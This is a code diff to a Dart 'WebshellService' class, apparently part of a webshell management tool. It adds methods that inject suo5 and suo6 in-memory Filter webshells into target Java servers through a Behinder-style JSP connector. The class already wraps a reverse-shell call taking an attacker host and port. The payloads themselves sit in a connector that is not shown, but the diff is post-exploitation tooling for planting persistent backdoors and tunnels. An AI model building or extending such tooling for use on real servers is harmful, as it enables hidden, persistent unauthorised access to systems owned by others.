@@ -3,6 +3,7 @@ export '../models/file_entry.dart';
 import 'dart:typed_data';
 
 import '../connectors/connector_factory.dart';
+import '../connectors/jsp_behinder_connector.dart';
 import '../connectors/shell_connector.dart';
 import '../models/file_entry.dart';
 import '../models/webshell.dart';
@@ -115,4 +116,28 @@ class WebshellService {
     bool preferScript = true,
   }) =>
       _connector.startReverseShell(lhost, lport, preferScript: preferScript);
+
+  /// 当前连接器是否支持注入内存马（仅 jsp_behinder 支持）。
+  bool get canInjectSuo5 => _connector is JspBehinderConnector;
+  bool get canInjectSuo6 => _connector is JspBehinderConnector;
+
+  /// 向目标注入 suo5 Filter 内存马。
+  Future<String> injectSuo5MemShell({
+    String filterName = 's5_mem',
+    String urlPath = '/*',
+  }) async {
+    final c = _connector;
+    if (c is! JspBehinderConnector) return '[Error] 当前连接器不支持 suo5 注入';
+    return c.injectSuo5MemShell(filterName: filterName, urlPath: urlPath);
+  }
+
+  /// 向目标注入 suo6 Filter 内存马（二进制多路复用隧道）。
+  Future<String> injectSuo6MemShell({
+    String filterName = 'suo6',
+    String urlPath = '/s6',
+  }) async {
+    final c = _connector;
+    if (c is! JspBehinderConnector) return '[Error] 当前连接器不支持 suo6 注入';
+    return c.injectSuo6MemShell(filterName: filterName, urlPath: urlPath);
+  }
 }
